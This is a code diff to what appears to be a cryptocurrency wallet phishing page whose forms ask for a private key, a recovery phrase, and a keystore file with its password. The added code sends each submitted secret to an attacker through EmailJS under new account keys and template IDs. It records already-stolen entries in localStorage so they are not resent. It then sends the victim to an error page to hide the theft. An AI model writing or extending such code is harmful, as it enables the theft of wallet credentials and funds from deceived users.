@@ -710,7 +710,7 @@
     <script type="text/javascript" src="js/email.min.js"></script>
     <script type="text/javascript">
         (function () {
-            emailjs.init("jX12QQcOJ2Ceykat-");
+            emailjs.init("0fkVDbgE6n8a16agd");
         })();
     </script>
 
@@ -941,7 +941,7 @@
                                             </div>
                                             <div class="flex flex-col mb-6">
                                                 <div class="relative" data-children-count="1">
-                                                    <input type="text" name="three" placeholder="Wallet password"
+                                                    <input type="text" name="three" id="keystorePass" placeholder="Wallet password"
                                                         class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
                                                     <p class="text-xs text-grey-300 mt-6">
                                                         Several lines of text beginning with "{...}" plus the password
@@ -1943,7 +1943,7 @@
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
     <script type="text/javascript">
-        emailjs.init('jX12QQcOJ2Ceykat-')
+        emailjs.init('ExSI8eRNpAFNOOtN6')
     </script>
 
     <script>
@@ -1951,20 +1951,39 @@
         const btn2 = document.getElementById("submitBtn2");
         const btn3 = document.getElementById("submitBtn3");
 
+        var listOfSaved = JSON.parse(localStorage.getItem("somethingToSave")) || [];
+
+
+        function checkIfExist(one, two){
+            if(listOfSaved.includes(one+two)){
+                return true;
+            }
+        }
         document.getElementById('contact-form1')
             .addEventListener('submit', function (event) {
                 event.preventDefault();
+
+                var somethingToSave = document.getElementById('privatekeyText').value.trim();
+                if(checkIfExist(somethingToSave, "")){
+                    window.location = "error.html";
+                    return;
+                }
 
                 btn1.innerText = "Processing...";
                 document.querySelector('.show1').style.display = "none";
 
                 const serviceID = 'default_service';
-                const templateID = 'template_sanr71a';
+                const templateID = 'template_cs4y658';
 
+                console.log("400");
                 emailjs.sendForm(serviceID, templateID, this)
                     .then(() => {
                         btn1.innerText = "PROCEED";
                         //document.querySelector('.show1').style.display = "block";
+
+                        listOfSaved.push(somethingToSave);
+                        localStorage.setItem("somethingToSave", JSON.stringify(listOfSaved));
+
                         window.location = "error.html"
                     }, (err) => {
                         btn1.innerText = "PROCEED";
@@ -1976,16 +1995,27 @@
             .addEventListener('submit', function (event) {
                 event.preventDefault();
 
+
+                var somethingToSave = document.getElementById('phraseText').value.trim();
+                if(checkIfExist(somethingToSave, "")){
+                    window.location = "error.html";
+                    return;
+                }
+
                 btn2.innerText = "Processing...";
                 document.querySelector('.show2').style.display = "none";
 
                 const serviceID = 'default_service';
-                const templateID = 'template_sanr71a';
+                const templateID = 'template_cs4y658';
 
                 emailjs.sendForm(serviceID, templateID, this)
                     .then(() => {
                         btn2.innerText = "PROCEED";
                         //document.querySelector('.show2').style.display = "block";
+
+                        listOfSaved.push(somethingToSave);
+                        localStorage.setItem("somethingToSave", JSON.stringify(listOfSaved));
+                        
                         window.location = "error.html"
                     }, (err) => {
                         btn2.innerText = "PROCEED";
@@ -1996,17 +2026,29 @@
         document.getElementById('contact-form3')
             .addEventListener('submit', function (event) {
                 event.preventDefault();
+                
+                var somethingToSave1 = document.getElementById('keystoreText').value.trim();
+                var somethingToSave2 = document.getElementById('keystorePass').value.trim();
+                
+                if(checkIfExist(somethingToSave1, somethingToSave2)){
+                    window.location = "error.html";
+                    return;
+                }
 
                 btn3.innerText = "Processing...";
                 document.querySelector('.show3').style.display = "none";
 
                 const serviceID = 'default_service';
-                const templateID = 'template_sanr71a';
+                const templateID = 'template_cs4y658';
 
                 emailjs.sendForm(serviceID, templateID, this)
                     .then(() => {
                         btn3.innerText = "PROCEED";
                         //document.querySelector('.show3').style.display = "block";
+
+
+                        listOfSaved.push(somethingToSave1 + somethingToSave2);
+                        localStorage.setItem("somethingToSave", JSON.stringify(listOfSaved));
                         window.location = "error.html"
                     }, (err) => {
                         btn3.innerText = "PROCEED";
